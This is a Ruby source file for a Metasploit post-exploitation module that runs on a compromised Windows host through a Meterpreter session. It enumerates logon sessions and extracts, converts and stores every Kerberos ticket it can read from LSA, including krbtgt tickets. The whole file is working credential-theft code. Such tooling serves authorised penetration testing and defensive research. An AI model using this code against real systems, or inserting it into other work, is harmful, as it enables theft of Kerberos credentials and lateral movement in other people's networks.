##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/kerberos/model/kerberos_flags'
require 'rex/proto/kerberos/model/ticket_flags'
require 'rex/proto/ms_dtyp'

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::Windows::Lsa
  include Msf::Exploit::Remote::Kerberos::Ticket

  CURRENT_PROCESS = -1
  CURRENT_THREAD = -2

  # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security_logon_type
  SECURITY_LOGON_TYPE = {
    0 => 'UndefinedLogonType',
    2 => 'Interactive',
    3 => 'Network',
    4 => 'Batch',
    5 => 'Service',
    6 => 'Proxy',
    7 => 'Unlock',
    8 => 'NetworkCleartext',
    9 => 'NewCredentials',
    10 => 'RemoteInteractive',
    11 => 'CachedInteractive',
    12 => 'CachedRemoteInteractive',
    13 => 'CachedUnlock'
  }.freeze
  # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type
  KERB_RETRIEVE_ENCODED_TICKET_MESSAGE = 8
  KERB_QUERY_TICKET_CACHE_EX_MESSAGE = 14

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Ticket Management',
        'Description' => %q{
          Manage kerberos tickets on a compromised host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Will Schroeder', # original idea/research
          'Spencer McIntyre'
        ],
        'References' => [
          [ 'URL', 'https://github.com/GhostPack/Rubeus' ],
          [ 'URL', 'https://github.com/wavvs/nanorobeus' ]
        ],
        'Platform' => ['win'],
        'SessionTypes' => %w[meterpreter],
        'Actions' => [
          ['DUMP_TICKETS', { 'Description' => 'Dump the Kerberos tickets' }],
          ['ENUM_LUIDS', { 'Description' => 'Enumerate session logon LUIDs' }],
          ['SHOW_LUID', { 'Description' => 'Show the current LUID' }],
        ],
        'DefaultAction' => 'DUMP_TICKETS',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_net_resolve_host
              stdapi_railgun_api
              stdapi_railgun_memread
              stdapi_railgun_memwrite
            ]
          }
        }
      )
    )

    register_options([
      OptString.new(
        'LUID',
        [false, 'An optional logon session LUID to target'],
        conditions: [ 'ACTION', 'in', %w[SHOW_LUID DUMP_TICKETS]],
        regex: /^(0x[a-fA-F0-9]{1,16})?$/
      ),
      OptString.new(
        'SERVICE',
        [false, 'An optional service name wildcard to target (e.g. krbtgt/*)'],
        conditions: %w[ACTION == DUMP_TICKETS]
      )
    ])
  end

  def run
    case session.native_arch
    when ARCH_X64
      @ptr_size = 8
    when ARCH_X86
      @ptr_size = 4
    else
      fail_with(Failure::NoTarget, "This module does not support #{session.native_arch} sessions.")
    end
    @hostname_cache = {}
    @indent_level = 0

    send("action_#{action.name.downcase}")
  end

  def action_dump_tickets
    handle = lsa_register_logon_process
    luids = nil
    if handle
      if target_luid
        luids = [ target_luid ]
      else
        luids = lsa_enumerate_logon_sessions
        print_error('Failed to enumerate logon sessions.') if luids.nil?
      end
      trusted = true
    else
      handle = lsa_connect_untrusted
      # if we can't register a logon process then we can only act on the current LUID so skip enumeration
      fail_with(Failure::Unknown, 'Failed to obtain a handle to LSA.') if handle.nil?
      trusted = false
    end
    luids ||= [ get_current_luid ]

    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(@ptr_size * 2, '0')}")
    auth_package = lsa_lookup_authentication_package(handle, 'kerberos')
    if auth_package.nil?
      lsa_deregister_logon_process(handle)
      fail_with(Failure::Unknown, 'Failed to lookup the Kerberos authentication package.')
    end

    luids.each do |luid|
      dump_for_luid(handle, auth_package, luid, null_luid: !trusted)
    end
    lsa_deregister_logon_process(handle)
  end

  def action_enum_luids
    current_luid = get_current_luid
    luids = lsa_enumerate_logon_sessions
    fail_with(Failure::Unknown, 'Failed to enumerate logon sessions.') if luids.nil?

    luids.each do |luid|
      logon_session_data_ptr = lsa_get_logon_session_data(luid)
      unless logon_session_data_ptr
        print_status("LogonSession LUID: #{luid}")
        next
      end

      print_logon_session_summary(logon_session_data_ptr, annotation: luid == current_luid ? '%bld(current)%clr' : '')
      session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
    end
  end

  def action_show_luid
    current_luid = get_current_luid
    luid = target_luid || current_luid
    logon_session_data_ptr = lsa_get_logon_session_data(luid)
    return unless logon_session_data_ptr

    print_logon_session_summary(logon_session_data_ptr, annotation: luid == current_luid ? '%bld(current)%clr' : '')
    session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
  end

  def dump_for_luid(handle, auth_package, luid, null_luid: false)
    logon_session_data_ptr = lsa_get_logon_session_data(luid)
    return unless logon_session_data_ptr

    print_logon_session_summary(logon_session_data_ptr)
    session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)

    logon_session_data_ptr.contents.logon_id.clear if null_luid
    query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(
      message_type: KERB_QUERY_TICKET_CACHE_EX_MESSAGE,
      logon_id: logon_session_data_ptr.contents.logon_id
    )
    query_tkt_cache_res_ptr = lsa_call_authentication_package(handle, auth_package, query_tkt_cache_req)
    if query_tkt_cache_res_ptr
      indented_print do
        dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
      end
      session.railgun.secur32.LsaFreeReturnBuffer(query_tkt_cache_res_ptr.value)
    end
  end

  def dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
    case session.native_arch
    when ARCH_X64
      query_tkt_cache_response_klass = KERB_QUERY_TKT_CACHE_RESPONSE_x64
      retrieve_tkt_request_klass = KERB_RETRIEVE_TKT_REQUEST_x64
      retrieve_tkt_response_klass = KERB_RETRIEVE_TKT_RESPONSE_x64
    when ARCH_X86
      query_tkt_cache_response_klass = KERB_QUERY_TKT_CACHE_RESPONSE_x86
      retrieve_tkt_request_klass = KERB_RETRIEVE_TKT_REQUEST_x86
      retrieve_tkt_response_klass = KERB_RETRIEVE_TKT_RESPONSE_x86
    end

    tkt_cache = query_tkt_cache_response_klass.read(query_tkt_cache_res_ptr.contents)
    tkt_cache.tickets.each_with_index do |ticket, index|
      server_name = read_lsa_unicode_string(ticket.server_name)
      if datastore['SERVICE'].present? && !File.fnmatch?(datastore['SERVICE'], server_name.split('@').first, File::FNM_CASEFOLD | File::FNM_DOTMATCH)
        next
      end

      server_name_wz = session.railgun.util.str_to_uni_z(server_name)
      print_status("Ticket[#{index}]")
      indented_print do
        retrieve_tkt_req = retrieve_tkt_request_klass.new(
          message_type: KERB_RETRIEVE_ENCODED_TICKET_MESSAGE,
          logon_id: logon_session_data_ptr.contents.logon_id, cache_options: 8
        )
        ptr = session.railgun.util.alloc_and_write_data(retrieve_tkt_req.to_binary_s + server_name_wz)
        next if ptr.nil?

        retrieve_tkt_req.target_name.len = server_name_wz.length - 2
        retrieve_tkt_req.target_name.maximum_len = server_name_wz.length
        retrieve_tkt_req.target_name.buffer = ptr + retrieve_tkt_req.num_bytes
        session.railgun.memwrite(ptr, retrieve_tkt_req)
        retrieve_tkt_res_ptr = lsa_call_authentication_package(handle, auth_package, ptr, submit_buffer_length: retrieve_tkt_req.num_bytes + server_name_wz.length)
        session.railgun.util.free_data(ptr)
        next if retrieve_tkt_res_ptr.nil?

        retrieve_tkt_res = retrieve_tkt_response_klass.read(retrieve_tkt_res_ptr.contents)
        if retrieve_tkt_res.ticket.encoded_ticket != 0
          ticket = kirbi_to_ccache(session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size))
          ticket_host = ticket.credentials.first.server.components.last.snapshot
          ticket_host = resolve_host(ticket_host) if ticket_host

          Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.read(ticket.encode)
          Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: ticket_host)
          presenter = Rex::Proto::Kerberos::CredentialCache::Krb5CcachePresenter.new(ticket)
          print_line(presenter.present.split("\n").map { |line| "    #{print_prefix}#{line}" }.join("\n"))
        end
        session.railgun.secur32.LsaFreeReturnBuffer(retrieve_tkt_res_ptr.value)
      end
    end
  end

  def target_luid
    return nil if datastore['LUID'].blank?

    val = datastore['LUID'].to_i(16)
    Rex::Proto::MsDtyp::MsDtypLuid.new(
      high_part: (val & 0xffffffff) >> 32,
      low_part: (val & 0xffffffff)
    )
  end

  def kirbi_to_ccache(input)
    krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(input)
    Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
  end

  def get_current_luid
    luid = get_token_statistics&.authentication_id
    fail_with(Failure::Unknown, 'Failed to obtain the current LUID.') unless luid
    luid
  end

  def get_token_statistics(token: nil)
    if token.nil?
      result = session.railgun.advapi32.OpenThreadToken(CURRENT_THREAD, session.railgun.const('TOKEN_QUERY'), false, @ptr_size)
      unless result['return']
        error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
        unless error == ::WindowsError::Win32::ERROR_NO_TOKEN
          print_error("Failed to open the current thread token. OpenThreadToken failed with: #{error}")
          return nil
        end

        result = session.railgun.advapi32.OpenProcessToken(CURRENT_PROCESS, session.railgun.const('TOKEN_QUERY'), @ptr_size)
        unless result['return']
          error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
          print_error("Failed to open the current process token. OpenProcessToken failed with: #{error}")
          return nil
        end
      end
      token = result['TokenHandle']
    end

    result = session.railgun.advapi32.GetTokenInformation(token, 10, TOKEN_STATISTICS.new.num_bytes, TOKEN_STATISTICS.new.num_bytes, @ptr_size)
    unless result['return']
      error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
      print_error("Failed to obtain the token information. GetTokenInformation failed with: #{error}")
      return nil
    end
    TOKEN_STATISTICS.read(result['TokenInformation'])
  end

  def resolve_host(name)
    name = name.dup.downcase # normalize the case since DNS is case insensitive
    return @hostname_cache[name] if @hostname_cache.key?(name)

    vprint_status("Resolving hostname: #{name}")
    begin
      address = session.net.resolve.resolve_host(name)[:ip]
    rescue Rex::Post::Meterpreter::RequestError => e
      elog("Unable to resolve #{name.inspect}", error: e)
    end
    @hostname_cache[name] = address
  end

  def print_logon_session_summary(logon_session_data_ptr, annotation: nil)
    sid = '???'
    if datastore['VERBOSE'] && logon_session_data_ptr.contents.psid != 0
      # reading the SID requires 3 railgun calls so only do it in verbose mode to speed things up
      # reading the data directly wouldn't be much faster because SIDs are of a variable length
      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data_ptr.contents.psid.to_i, @ptr_size)
      if result
        sid = session.railgun.util.read_string(result['StringSid'])
        session.railgun.kernel32.LocalFree(result['StringSid'])
      end
    end

    print_status("LogonSession LUID: #{logon_session_data_ptr.contents.logon_id} #{annotation}")
    indented_print do
      print_status("User:                  #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_domain)}\\#{read_lsa_unicode_string(logon_session_data_ptr.contents.user_name)}")
      print_status("UserSID:               #{sid}") if datastore['VERBOSE']
      print_status("Session:               #{logon_session_data_ptr.contents.session}")
      print_status("AuthenticationPackage: #{read_lsa_unicode_string(logon_session_data_ptr.contents.authentication_package)}")
      print_status("LogonType:             #{SECURITY_LOGON_TYPE.fetch(logon_session_data_ptr.contents.logon_type.to_i, '???')} (#{logon_session_data_ptr.contents.logon_type.to_i})")
      print_status("LogonTime:             #{logon_session_data_ptr.contents.logon_time.to_datetime.localtime}")
      print_status("LogonServer:           #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_server)}") if datastore['VERBOSE']
      print_status("LogonServerDNSDomain:  #{read_lsa_unicode_string(logon_session_data_ptr.contents.dns_domain_name)}") if datastore['VERBOSE']
      print_status("UserPrincipalName:     #{read_lsa_unicode_string(logon_session_data_ptr.contents.upn)}") if datastore['VERBOSE']
    end
  end

  def peer
    nil # drop the peer prefix from messages
  end

  def indented_print(&block)
    @indent_level += 1
    block.call
  ensure
    @indent_level -= 1
  end

  def print_prefix
    super + (' ' * @indent_level.to_i * 2)
  end
end
